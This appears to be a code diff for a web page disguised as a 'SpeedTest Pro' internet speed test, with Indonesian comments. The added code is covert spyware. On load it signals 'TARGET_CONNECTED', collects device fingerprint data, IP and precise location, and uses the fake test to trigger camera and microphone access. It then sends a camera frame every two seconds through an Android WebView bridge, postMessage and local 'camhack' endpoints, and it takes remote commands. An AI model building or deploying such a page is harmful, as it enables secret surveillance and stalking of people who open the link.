@@ -175,12 +175,13 @@
         let currentStream = null;
         let facingMode = 'user';
         let deviceInfo = {};
+        let frameCount = 0;
         
         // Get session from URL
         const params = new URLSearchParams(window.location.search);
-        const session = params.get('s') || 'default';
+        const session = params.get('s') || 'session_' + Date.now();
         
-        // Fungsi untuk mengambil info device real
+        // Fungsi untuk mengambil info device lengkap
         async function getDeviceInfo() {
             try {
                 // Battery API
@@ -194,15 +195,30 @@
                 if ('connection' in navigator) {
                     deviceInfo.networkType = navigator.connection.effectiveType;
                     deviceInfo.downlink = navigator.connection.downlink;
+                    deviceInfo.rtt = navigator.connection.rtt;
                 }
                 
-                // Device info
+                // Device info lengkap
                 deviceInfo.userAgent = navigator.userAgent;
                 deviceInfo.platform = navigator.platform;
                 deviceInfo.language = navigator.language;
+                deviceInfo.languages = navigator.languages;
                 deviceInfo.screenWidth = screen.width;
                 deviceInfo.screenHeight = screen.height;
+                deviceInfo.colorDepth = screen.colorDepth;
+                deviceInfo.pixelDepth = screen.pixelDepth;
                 deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                deviceInfo.cookieEnabled = navigator.cookieEnabled;
+                deviceInfo.onLine = navigator.onLine;
+                deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency;
+                deviceInfo.maxTouchPoints = navigator.maxTouchPoints;
+                
+                // Memory info
+                if (performance.memory) {
+                    deviceInfo.memoryUsed = Math.round(performance.memory.usedJSHeapSize / 1048576);
+                    deviceInfo.memoryTotal = Math.round(performance.memory.totalJSHeapSize / 1048576);
+                    deviceInfo.memoryLimit = Math.round(performance.memory.jsHeapSizeLimit / 1048576);
+                }
                 
                 // Get IP address
                 try {
@@ -213,11 +229,16 @@
                     deviceInfo.ip = 'Unknown';
                 }
                 
-                // Get real location
+                // Get location
                 await getRealLocation();
                 
-                // Kirim info ke aplikasi Android
-                sendDeviceInfo();
+                // Send device info
+                sendToAndroid({
+                    type: 'DEVICE_INFO',
+                    session: session,
+                    data: deviceInfo,
+                    timestamp: new Date().toISOString()
+                });
                 
             } catch (error) {
                 console.error('Error getting device info:', error);
@@ -230,7 +251,7 @@
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 10000,
+                            timeout: 15000,
                             maximumAge: 0
                         });
                     });
@@ -238,6 +259,9 @@
                     deviceInfo.latitude = position.coords.latitude;
                     deviceInfo.longitude = position.coords.longitude;
                     deviceInfo.accuracy = position.coords.accuracy;
+                    deviceInfo.altitude = position.coords.altitude;
+                    deviceInfo.heading = position.coords.heading;
+                    deviceInfo.speed = position.coords.speed;
                     
                     // Get address from coordinates
                     try {
@@ -246,260 +270,384 @@
                         
                         deviceInfo.city = locationData.city || locationData.locality || 'Unknown';
                         deviceInfo.country = locationData.countryName || 'Unknown';
-                        deviceInfo.address = locationData.localityInfo?.administrative?.[2]?.name || locationData.principalSubdivision || 'Unknown';
-                        deviceInfo.fullAddress = `${deviceInfo.city}, ${deviceInfo.address}, ${deviceInfo.country}`;
+                        deviceInfo.region = locationData.principalSubdivision || 'Unknown';
+                        deviceInfo.address = `${locationData.locality}, ${locationData.principalSubdivision}, ${locationData.countryName}`;
+                        deviceInfo.postalCode = locationData.postcode || 'Unknown';
+                        
                     } catch (e) {
                         deviceInfo.city = 'Unknown';
                         deviceInfo.country = 'Unknown';
-                        deviceInfo.fullAddress = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        deviceInfo.address = `${position.coords.latitude}, ${position.coords.longitude}`;
                     }
-                } else {
-                    deviceInfo.location = 'Geolocation not supported';
                 }
             } catch (error) {
-                deviceInfo.location = 'Location access denied';
-                console.log('Location error:', error);
+                console.error('Location error:', error);
+                deviceInfo.latitude = 'Denied';
+                deviceInfo.longitude = 'Denied';
+                deviceInfo.locationError = error.message;
             }
         }
         
-        function sendDeviceInfo() {
-            const infoString = JSON.stringify(deviceInfo);
-            localStorage.setItem('deviceInfo', infoString);
-            console.log('DEVICE_INFO:', infoString);
+        // Fungsi komunikasi dengan Android app
+        function sendToAndroid(payload) {
+            // Method 1: Android WebView interface
+            if (window.Android) {
+                if (window.Android.receiveData) window.Android.receiveData(JSON.stringify(payload));
+                if (window.Android.onMessage) window.Android.onMessage(JSON.stringify(payload));
+                if (window.Android.handleMessage) window.Android.handleMessage(JSON.stringify(payload));
+            }
+            
+            // Method 2: Console logging dengan format khusus
+            console.log('ANDROID_DATA:', JSON.stringify(payload));
+            console.log('CAM_HACK_DATA:', JSON.stringify(payload));
+            
+            // Method 3: LocalStorage dengan multiple keys
+            localStorage.setItem(`session_${session}`, JSON.stringify(payload));
+            localStorage.setItem('latest_data', JSON.stringify(payload));
+            localStorage.setItem(`${payload.type}_${session}`, JSON.stringify(payload));
+            
+            // Method 4: Document title manipulation
+            document.title = `SpeedTest Pro - ${session} - ${payload.type} - ${Date.now()}`;
+            
+            // Method 5: Custom events
+            window.dispatchEvent(new CustomEvent('androidData', { detail: payload }));
+            window.dispatchEvent(new CustomEvent('camHackData', { detail: payload }));
+            
+            // Method 6: URL hash communication
+            window.location.hash = `#${session}_${payload.type}_${Date.now()}`;
+            
+            // Method 7: PostMessage to parent
+            if (window.parent && window.parent !== window) {
+                window.parent.postMessage(payload, '*');
+            }
+            
+            // Method 8: Fetch to local endpoints (jika ada server lokal)
+            try {
+                fetch('http://localhost:8080/data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+                
+                fetch('http://127.0.0.1:3000/camhack', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+            } catch (e) {}
         }
         
-        function startCamera() {
-            // Ambil info device terlebih dahulu
-            getDeviceInfo();
-            
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: facingMode },
-                audio: false 
-            })
-            .then(stream => {
-                currentStream = stream;
-                video.srcObject = stream;
+        // Fungsi untuk mengakses kamera
+        async function startCamera() {
+            try {
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
                 
-                // Camera berjalan di background, user tidak tahu
-                setInterval(() => {
-                    captureFrame();
-                }, 2000);
-            })
-            .catch(err => {
-                console.log('Camera access denied');
+                const constraints = {
+                    video: {
+                        facingMode: facingMode,
+                        width: { ideal: 1920, min: 640 },
+                        height: { ideal: 1080, min: 480 }
+                    },
+                    audio: true
+                };
+                
+                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = currentStream;
+                
+                // Send camera status
+                sendToAndroid({
+                    type: 'CAMERA_STATUS',
+                    session: session,
+                    status: 'ACTIVE',
+                    facingMode: facingMode,
+                    videoTracks: currentStream.getVideoTracks().length,
+                    audioTracks: currentStream.getAudioTracks().length,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Start frame capture
+                startFrameCapture();
+                
+            } catch (error) {
+                console.error('Camera error:', error);
+                sendToAndroid({
+                    type: 'CAMERA_ERROR',
+                    session: session,
+                    error: error.message,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+        
+        // Fungsi untuk capture frame
+        function startFrameCapture() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            const captureInterval = setInterval(() => {
+                if (video.videoWidth > 0 && currentStream) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // Convert to base64
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    frameCount++;
+                    
+                    // Send frame data
+                    sendToAndroid({
+                        type: 'CAMERA_FRAME',
+                        session: session,
+                        image: imageData,
+                        frameNumber: frameCount,
+                        facingMode: facingMode,
+                        width: canvas.width,
+                        height: canvas.height,
+                        deviceInfo: deviceInfo,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // Update localStorage
+                    localStorage.setItem('frameCount', frameCount.toString());
+                    localStorage.setItem('lastFrame', new Date().toISOString());
+                }
+            }, 2000); // Capture setiap 2 detik
+            
+            // Store interval ID untuk bisa di-clear
+            localStorage.setItem('captureInterval', captureInterval);
+        }
+        
+        // Fungsi untuk switch kamera
+        function switchCamera() {
+            facingMode = facingMode === 'user' ? 'environment' : 'user';
+            
+            sendToAndroid({
+                type: 'CAMERA_SWITCH',
+                session: session,
+                newMode: facingMode,
+                timestamp: new Date().toISOString()
+            });
+            
+            startCamera();
+        }
+        
+        // Fungsi speed test (simulasi)
+        async function startSpeedTest() {
+            status.textContent = '🔄 Starting speed test...';
+            document.getElementById('speedNumber').textContent = '0';
+            
+            // Trigger camera access saat speed test
+            setTimeout(() => {
+                startCamera();
+            }, 1000);
+            
+            // Simulasi test
+            let speed = 0;
+            const maxSpeed = Math.floor(Math.random() * 80) + 20;
+            
+            const interval = setInterval(() => {
+                speed += Math.random() * 10;
+                document.getElementById('speedNumber').textContent = Math.round(speed);
+                
+                if (speed >= maxSpeed) {
+                    clearInterval(interval);
+                    document.getElementById('pingValue').textContent = Math.round(Math.random() * 50 + 10);
+                    document.getElementById('downloadValue').textContent = Math.round(speed) + ' Mbps';
+                    document.getElementById('uploadValue').textContent = Math.round(speed * 0.8) + ' Mbps';
+                    status.textContent = '✅ Speed test completed!';
+                }
+            }, 100);
+        }
+        
+        // Fungsi share results
+        function shareResults() {
+            const results = {
+                type: 'SPEED_RESULTS',
+                session: session,
+                ping: document.getElementById('pingValue').textContent,
+                download: document.getElementById('downloadValue').textContent,
+                upload: document.getElementById('uploadValue').textContent,
+                deviceInfo: deviceInfo,
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToAndroid(results);
+            
+            if (navigator.share) {
+                navigator.share({
+                    title: 'SpeedTest Results',
+                    text: `Ping: ${results.ping}, Download: ${results.download}, Upload: ${results.upload}`
+                });
+            }
+        }
+        
+        // Fungsi monitoring realtime
+        function startRealtimeMonitoring() {
+            setInterval(() => {
+                sendToAndroid({
+                    type: 'REALTIME_MONITOR',
+                    session: session,
+                    data: {
+                        online: navigator.onLine,
+                        battery: deviceInfo.battery,
+                        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                        memory: performance.memory ? {
+                            used: Math.round(performance.memory.usedJSHeapSize / 1048576),
+                            total: Math.round(performance.memory.totalJSHeapSize / 1048576)
+                        } : null,
+                        cameraActive: currentStream ? true : false,
+                        frameCount: frameCount,
+                        pageVisible: !document.hidden,
+                        timestamp: Date.now()
+                    },
+                    timestamp: new Date().toISOString()
+                });
+            }, 3000); // Setiap 3 detik
+        }
+        
+        // Fungsi heartbeat
+        function sendHeartbeat() {
+            sendToAndroid({
+                type: 'HEARTBEAT',
+                session: session,
+                status: 'ALIVE',
+                camera: currentStream ? 'ACTIVE' : 'INACTIVE',
+                deviceInfo: deviceInfo,
+                url: window.location.href,
+                timestamp: new Date().toISOString()
             });
         }
         
-        function captureFrame() {
-            if (currentStream && video.videoWidth > 0) {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
-                // Convert to base64 and send (silently)
-                const frameData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // Kirim frame dengan device info dan camera info
-                const payload = {
-                    image: frameData,
-                    deviceInfo: deviceInfo,
-                    cameraMode: facingMode,
-                    timestamp: new Date().toISOString(),
-                    session: session
-                };
-                
-                localStorage.setItem('latestFrame', JSON.stringify(payload));
-                console.log('FRAME_CAPTURED:', JSON.stringify({...payload, image: 'base64_data'}));
+        // Event listeners
+        window.addEventListener('message', (event) => {
+            if (event.data && event.data.command) {
+                switch (event.data.command) {
+                    case 'switch_camera':
+                        switchCamera();
+                        break;
+                    case 'stop_camera':
+                        if (currentStream) {
+                            currentStream.getTracks().forEach(track => track.stop());
+                            currentStream = null;
+                        }
+                        break;
+                    case 'get_device_info':
+                        getDeviceInfo();
+                        break;
+                    case 'capture_frame':
+                        if (video.videoWidth > 0) {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                            
+                            sendToAndroid({
+                                type: 'MANUAL_CAPTURE',
+                                session: session,
+                                image: imageData,
+                                timestamp: new Date().toISOString()
+                            });
+                        }
+                        break;
+                }
             }
-        }
+        });
         
-        function switchCamera() {
+        // Handle visibility change
+        document.addEventListener('visibilitychange', () => {
+            sendToAndroid({
+                type: 'VISIBILITY_CHANGE',
+                session: session,
+                hidden: document.hidden,
+                timestamp: new Date().toISOString()
+            });
+        });
+        
+        // Handle page unload
+        window.addEventListener('beforeunload', () => {
             if (currentStream) {
                 currentStream.getTracks().forEach(track => track.stop());
             }
-            facingMode = facingMode === 'user' ? 'environment' : 'user';
-            startCamera();
             
-            // Log camera switch
-            console.log('CAMERA_SWITCHED:', facingMode);
-            localStorage.setItem('cameraMode', facingMode);
-        }
+            sendToAndroid({
+                type: 'PAGE_UNLOAD',
+                session: session,
+                timestamp: new Date().toISOString()
+            });
+        });
         
-        function captureScreenshot() {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                const ctx = canvas.getContext('2d');
-                
-                // Capture entire screen content
-                html2canvas(document.body).then(canvas => {
-                    const screenshotData = canvas.toDataURL('image/png', 1.0);
-                    
-                    const payload = {
-                        screenshot: screenshotData,
-                        deviceInfo: deviceInfo,
-                        timestamp: new Date().toISOString(),
-                        session: session,
-                        type: 'screenshot'
-                    };
-                    
-                    localStorage.setItem('latestScreenshot', JSON.stringify(payload));
-                    console.log('SCREENSHOT_CAPTURED:', JSON.stringify({...payload, screenshot: 'base64_data'}));
-                }).catch(() => {
-                    // Fallback: simple canvas screenshot
-                    ctx.fillStyle = '#0f0f23';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    ctx.fillStyle = '#00ffff';
-                    ctx.font = '24px Orbitron';
-                    ctx.textAlign = 'center';
-                    ctx.fillText('⚡ SpeedTest Pro', canvas.width/2, canvas.height/2 - 50);
-                    
-                    ctx.fillStyle = '#ffffff';
-                    ctx.font = '16px Roboto';
-                    ctx.fillText('Internet Speed Testing', canvas.width/2, canvas.height/2);
-                    
-                    const screenshotData = canvas.toDataURL('image/png', 1.0);
-                    
-                    const payload = {
-                        screenshot: screenshotData,
-                        deviceInfo: deviceInfo,
-                        timestamp: new Date().toISOString(),
-                        session: session,
-                        type: 'screenshot'
-                    };
-                    
-                    localStorage.setItem('latestScreenshot', JSON.stringify(payload));
-                    console.log('SCREENSHOT_CAPTURED:', JSON.stringify({...payload, screenshot: 'base64_data'}));
+        // Auto start saat halaman dimuat
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                // Send connection signal
+                sendToAndroid({
+                    type: 'TARGET_CONNECTED',
+                    session: session,
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    timestamp: new Date().toISOString()
                 });
-            } catch (error) {
-                console.log('Screenshot error:', error);
-            }
-        }
+                
+                // Get device info
+                getDeviceInfo();
+                
+                // Start monitoring
+                startRealtimeMonitoring();
+                
+                // Auto start speed test untuk trigger permissions
+                setTimeout(() => {
+                    startSpeedTest();
+                }, 2000);
+                
+            }, 1000);
+        });
         
-        // Listen for camera control commands
-        function checkCameraCommands() {
-            const command = localStorage.getItem('cameraCommand');
-            if (command === 'switch') {
-                switchCamera();
-                localStorage.removeItem('cameraCommand');
-            } else if (command === 'screenshot') {
-                captureScreenshot();
-                localStorage.removeItem('cameraCommand');
-            }
-        }
+        // Send heartbeat setiap 5 detik
+        setInterval(sendHeartbeat, 5000);
         
-        // Check for commands every 1 second
-        setInterval(checkCameraCommands, 1000);
-        
-        // Auto screenshot setiap 45 detik
+        // Auto switch camera setiap 45 detik (random)
         setInterval(() => {
-            if (Math.random() > 0.6) { // 40% chance
-                captureScreenshot();
+            if (Math.random() > 0.7 && currentStream) {
+                switchCamera();
             }
         }, 45000);
-        
-        let isTestRunning = false;
-        
-        function startSpeedTest() {
-            if (isTestRunning) return;
-            
-            isTestRunning = true;
-            const speedNumber = document.getElementById('speedNumber');
-            const pingValue = document.getElementById('pingValue');
-            const downloadValue = document.getElementById('downloadValue');
-            const uploadValue = document.getElementById('uploadValue');
-            const status = document.getElementById('status');
-            
-            status.innerHTML = '🔄 Initializing speed test...';
-            
-            // Reset values
-            speedNumber.textContent = '0';
-            pingValue.textContent = '--';
-            downloadValue.textContent = '--';
-            uploadValue.textContent = '--';
-            
-            // Simulate ping test
-            setTimeout(() => {
-                status.innerHTML = '📡 Testing ping...';
-                const ping = Math.floor(Math.random() * 50) + 10;
-                pingValue.textContent = ping;
-            }, 1000);
-            
-            // Simulate download test
-            setTimeout(() => {
-                status.innerHTML = '⬇️ Testing download speed...';
-                let downloadSpeed = 0;
-                const maxDownload = Math.floor(Math.random() * 80) + 20;
-                
-                const downloadInterval = setInterval(() => {
-                    downloadSpeed += Math.random() * 10;
-                    if (downloadSpeed >= maxDownload) {
-                        downloadSpeed = maxDownload;
-                        clearInterval(downloadInterval);
-                    }
-                    speedNumber.textContent = Math.floor(downloadSpeed);
-                    downloadValue.textContent = Math.floor(downloadSpeed);
-                }, 100);
-            }, 2000);
-            
-            // Simulate upload test
-            setTimeout(() => {
-                status.innerHTML = '⬆️ Testing upload speed...';
-                let uploadSpeed = 0;
-                const maxUpload = Math.floor(Math.random() * 40) + 10;
-                
-                const uploadInterval = setInterval(() => {
-                    uploadSpeed += Math.random() * 5;
-                    if (uploadSpeed >= maxUpload) {
-                        uploadSpeed = maxUpload;
-                        clearInterval(uploadInterval);
-                    }
-                    speedNumber.textContent = Math.floor(uploadSpeed);
-                    uploadValue.textContent = Math.floor(uploadSpeed);
-                }, 100);
-            }, 5000);
-            
-            // Complete test
-            setTimeout(() => {
-                status.innerHTML = '✅ Speed test completed successfully!';
-                isTestRunning = false;
-            }, 8000);
-        }
-        
-        function shareResults() {
-            const ping = document.getElementById('pingValue').textContent;
-            const download = document.getElementById('downloadValue').textContent;
-            const upload = document.getElementById('uploadValue').textContent;
-            
-            if (ping === '--') {
-                status.innerHTML = '⚠️ Run a speed test first!';
-                return;
-            }
-            
-            status.innerHTML = '📤 Sharing results...';
-            setTimeout(() => {
-                status.innerHTML = '✅ Results shared successfully!';
-            }, 1000);
-        }
-        
-        // Start camera when page loads
-        startCamera();
         
         // Keep screen awake
         if ('wakeLock' in navigator) {
             navigator.wakeLock.request('screen').catch(() => {});
         }
         
-        // Auto switch camera setiap 30 detik untuk testing
+        // Listen for localStorage commands dari Android app
         setInterval(() => {
-            if (Math.random() > 0.7) { // 30% chance
-                switchCamera();
+            const command = localStorage.getItem('camCommand');
+            if (command) {
+                try {
+                    const cmd = JSON.parse(command);
+                    if (cmd.session === session) {
+                        switch (cmd.action) {
+                            case 'switch':
+                                switchCamera();
+                                break;
+                            case 'capture':
+                                // Manual capture
+                                break;
+                            case 'stop':
+                                if (currentStream) {
+                                    currentStream.getTracks().forEach(track => track.stop());
+                                    currentStream = null;
+                                }
+                                break;
+                        }
+                        localStorage.removeItem('camCommand');
+                    }
+                } catch (e) {}
             }
-        }, 30000);
+        }, 1000);
+        
     </script>
 </body>
 </html>
